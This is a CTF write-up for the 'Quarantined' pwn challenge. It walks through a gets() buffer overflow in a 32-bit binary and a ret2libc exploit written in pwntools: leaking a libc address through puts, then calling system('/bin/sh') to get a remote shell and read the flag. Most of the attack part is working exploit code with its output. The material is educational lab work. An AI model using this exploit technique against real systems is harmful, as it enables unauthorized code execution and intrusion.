# WGMY Fortnight Challenge #1005: Quarantined
>fortnight1005.wargames.my:46738

>Download here:
>https://drive.google.com/file/d/16fESTgt-5OSFU_6R_LNOIEPjr8kO7FJK

>File Info:
>fortnight_1005.7z
>SHA256: 589f571faa61544e90474d56c51e37ef7ba6eec69283a59633709496ee026fd3
>7z password: wgmy

Inside the 7z got 2 files:
- [libc.so.6](libc.so.6)  
- [quarantined](quarantined)

`libc.so.6` is the C library (libc) used by the challenge machine
`quarantined` is a ELF 32bit executable file

Lets do some basic enumeration first:
```
checksec quarantined
[!] Did not find any GOT entries
[*] '/root/Downloads/wgmy/quarine/quarantined'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Running `checksec` to see the which protection is enabled

Notice all protection is disabled except NX (Means we cannot execute shellcode on stack)

Based on the result:
- **We able to Overwrite GOT entry (Global Offset Table)**
- **Overwrite return address easily**
- **Function address in file is mapped same as memory, because No PIE (Position Independent Executables)**

Notice there is no GOT entry in the executable:
```
[!] Did not find any GOT entries
```

Lets try to netcat!
```
nc fortnight1005.wargames.my 46738
Before you do something to this program, i need to have a sanity check.
please input 1+1
2
```
When enter an input it just exit, no matter what we input

## Analyze

Now lets run it with `Ghidra` to decompile it!

**entry function:**
```c
void entry(void)

{
  __libc_start_main(FUN_080485a1);
  do {
                    /* WARNING: Do nothing block with infinite loop */
  } while( true );
}
```
**In FUN_080485a1(main):**
```c
void main(void)

{
  undefined *puVar1;
  
  puVar1 = &stack0x00000004;
  setvbuf(*(FILE **)PTR_stdin_08049ff8,(char *)0x0,2,0);
  setvbuf(*(FILE **)PTR_stdout_08049ffc,(char *)0x0,2,0);
  FUN_08048562(puVar1);
  return;
}
```
**In FUN_08048562(vuln):**
```c
void vuln()

{
  char buf [1028];
  
  puts("Before you do something to this program, i need to have a sanity check.\nplease input 1+1");
  gets(buf);
}
```
Obviously is a **buffer overflow** vulnerability!

Because of the use of `gets` function

Buffer Overflow example:
```
Ex: Buf got 1028 bytes

[  Buf(1028 bytes)  ][ EBP ][ EIP ]
[        Input      ]               (No overflow)
[           Input              ]    (Overflow) 

It will give error message like SIGFAULT because EIP (return address) is overwritten
```

**In FUN_08048526:**
```c
void FUN_08048526(void)

{
  printf("I will never cat flag");
  system("/bin/echo Not Again");
  return;
}
```
This function just print and echo, so we will ignore this function

Although no GOT entry, we found something like PLT(Procedure Linkage Table) and GOT entry of some function at following address:

PLT is first executed when the function is called, it **jump to address in GOT entry:**
```
thunk int printf(char * __format, ...)
            
080483a0 ff 25 0c        JMP        dword ptr [DAT_0804a00c] -> printf
         a0 04 08                                                             

                           
thunk char * gets(char * __s)
          
080483b0 ff 25 10        JMP        dword ptr [DAT_0804a010] -> gets  
         a0 04 08                                                                    

thunk int puts(char * __s)

080483c0 ff 25 14        JMP        dword ptr [DAT_0804a014] -> puts          
         a0 04 08                                                                    

thunk int system(char * __command)
               
080483d0 ff 25 18        JMP        dword ptr [DAT_0804a018] -> system
         a0 04 08                                                             

```
GOT entry:

|Function|Location|
|---|---|
|`__DT_PLTGOT`|0x804a000|
|`gets`|0x804a010|
|`printf`|0x804a00c|
|`puts`|0x804a014|
|`system`|0x804a018|	
|`__libc_start_main`|0x804a01c|


**GOT (Global Offset Table)** contains library function address like printf, system etc.

But the those address is only loaded when the function is been called, and the address is randomly choosen (ASLR)

But each function address offset/distance is always the same!

For example:
``` 
If printf and system offset is 50:

1st execute
printf GOT: 100
system GOT:  50

2nd execute
printf GOT: 600
system GOT: 550

3rd execute
printf GOT: 300
system GOT: 250
```
We have `system` address but we still need a `/bin/sh` string to execute shell

Luckily inside libc got this string so if we leak function address then can calculate its offset to the string address

To expliot this, our plan is:
1. **Use `puts` function to leak address from GOT table**
2. **Run `vuln` function again so can exploit again**
3. **Calculate its offset between "/bin/sh" string in library**
4. **Run `system(binsh address)`**
5. **Cat the damn flag!**

## Testing
Before we exploit the actual machine, lets test with our local machine first

I used pwntools in python:
```py
from pwn import *
elf = ELF("./quarantined")
p = elf.process()
vuln = 0x8048562
# Test with 1028 + 4 input
# p32 converts number to raw binary in reverse order (Little endian)
# For vuln address is \x62\x85\x04\x08
p.sendlineafter("1+1\n",'a'*1032+p32(vuln)) 
print(p.recv()) # Print output
```
Result:
```
EOFError
[*] Process '/root/Downloads/wgmy/quarine/quarantined' stopped with exit code -11 (SIGSEGV) (pid 66087)
```
Failed... lets try add another 4 character

```py
from pwn import *
elf = ELF("./quarantined")
p = elf.process()
vuln = 0x8048562
p.sendlineafter("1+1\n",'a'*1036+p32(vuln)) # Test with 1028 + 8 input
print(p.recv()) # Print output
```

```
[x] Starting local process '/root/Downloads/wgmy/quarine/quarantined'
[+] Starting local process '/root/Downloads/wgmy/quarine/quarantined': pid 66124
Before you do something to this program, i need to have a sanity check.
please input 1+1

[*] Stopped process '/root/Downloads/wgmy/quarine/quarantined' (pid 66124)
```
Yes! Looks like we successfully execute `vuln` function!

Now lets try to use `puts` function to print something and return to `vuln` again

The payload should be `puts` + `vuln` + `string` based on the stack layout when calling function:
![image](stack-convention.png)

*EBP is puts, return address is vuln and string is 1st parameter*
```py
from pwn import *
elf = ELF("./quarantined")
p = elf.process()
vuln = 0x8048562
puts_plt = 0x80483c0
# Search the address of string "1+1"
string = next(elf.search("1+1"))
p.sendlineafter("1+1\n",'a'*1036+p32(puts_plt)+p32(vuln)+p32(string))

print(p.recv())
```
```
1+1
Before you do something to this program, i need to have a sanity check.
please input 1+1

[*] Stopped process '/root/Downloads/wgmy/quarine/quarantined' (pid 70988)
```
Yeah! Looks like we successfully print something using `puts`

Lets try to leak an address in GOT!

We only can leak function that called before, so only `puts` and `gets`

I choose `gets` for this exploit:
```py
from pwn import *
elf = ELF("./quarantined")
p = elf.process()
vuln = 0x8048562
puts_plt = 0x80483c0
gets_got = 0x804a010
p.sendlineafter("1+1\n",'a'*1036+p32(puts_plt)+p32(vuln)+p32(gets_got))
# Receive until a newline (puts ends with newline)
print(repr(p.recvuntil("\n"))) 
```
```
'@\xcb\xd5\xf7\x90\xd5\xd5\xf7\xd6\x83\x04\x08\n'
[*] Stopped process '/root/Downloads/wgmy/quarine/quarantined' (pid 72587)
```
We successfully leaked the libc address of `gets`!

It prints many bytes because `puts` function print until NULL bytes

We only need first 4 bytes

```py
p.sendlineafter("1+1\n",'a'*1036+p32(puts_plt)+p32(vuln)+p32(gets_got))
# [:4] get first 4 character
# u32 converts raw bytes to number
print(hex(u32(p.recvuntil("\n")[:4])))
```
```
0xf7db1b40
[*] Stopped process '/root/Downloads/wgmy/quarine/quarantined' (pid 72988)
```
Lets verify the address with GDB Debugger:
```
gdb quarantined 
GNU gdb (Debian 9.1-2) 9.1
...
...
Reading symbols from quarantined...
(No debugging symbols found in quarantined)
pwndbg> r
Starting program: /root/Downloads/wgmy/quarine/quarantined 
Before you do something to this program, i need to have a sanity check.
please input 1+1
j
[Inferior 1 (process 72914) exited with code 020]
pwndbg> x gets
0xf7e2fb40 <_IO_gets>:	0x57e58955
``` 
Notice last 3 digit is the same because the **function offset is fixed**

So we leaked the correct address of `gets` !

Now we can start calculate the offset and execute `system` with `/bin/sh`

```py
from pwn import *
elf = ELF("./quarantined")
# Use libc in my local machine 
libc = ELF("/usr/lib/i386-linux-gnu/libc.so.6")
p = elf.process()
vuln = 0x8048562
puts_plt = 0x80483c0
system_plt = 0x80483d0
gets_got = 0x804a010
# Calculate the offset between gets and /bin/sh
binsh_offset = libc.symbols['gets'] - next(libc.search("/bin/sh"))
# Leak gets in libc
p.sendlineafter("1+1\n",'a'*1036+p32(puts_plt)+p32(vuln)+p32(gets_got))
gets_libc = u32(p.recvuntil("\n")[:4])
# Calculate binsh address
binsh_libc = gets_libc - binsh_offset
# Execute shell!
p.sendlineafter("1+1\n",'a'*1036+p32(system_plt)+p32(vuln)+p32(binsh_libc))
# Switch to interactive mode
p.interactive()
```
```
[+] Starting local process '/root/Downloads/wgmy/quarine/quarantined': pid 73610
[*] Switching to interactive mode
$ ls
core           libc.so.6    README.md  stack-convention.png
fortnight_1005.7z  quarantined    solve.py   test.py

```
Yay!! We executed a shell!

Lets exploit with the challenge machine:
```py
from pwn import *
elf = ELF("./quarantined")
# libc = ELF("/usr/lib/i386-linux-gnu/libc.so.6")
libc = ELF("libc.so.6") # Use the libc provided
# p = elf.process()
p = remote("fortnight1005.wargames.my",46738)
...
...
...
p.interactive()
```
```
[+] Opening connection to fortnight1005.wargames.my on port 46738: Done
[*] Switching to interactive mode
$ ls
flag.txt
quarantined
$ cat flag.txt
wgmy{dud3_l375_50c14l_d1574nc1n6_f0r_l1f3}
[*] Got EOF while reading in interactive
```
Thats it! Easy challenge

[Exploit script](solve.py)

## Flag
```
wgmy{dud3_l375_50c14l_d1574nc1n6_f0r_l1f3}
```
## Reference:
[Global Offset Table (GOT) and Procedure Linkage Table (PLT) - bin 0x12](https://www.youtube.com/watch?v=kUk5pw4w0h4)
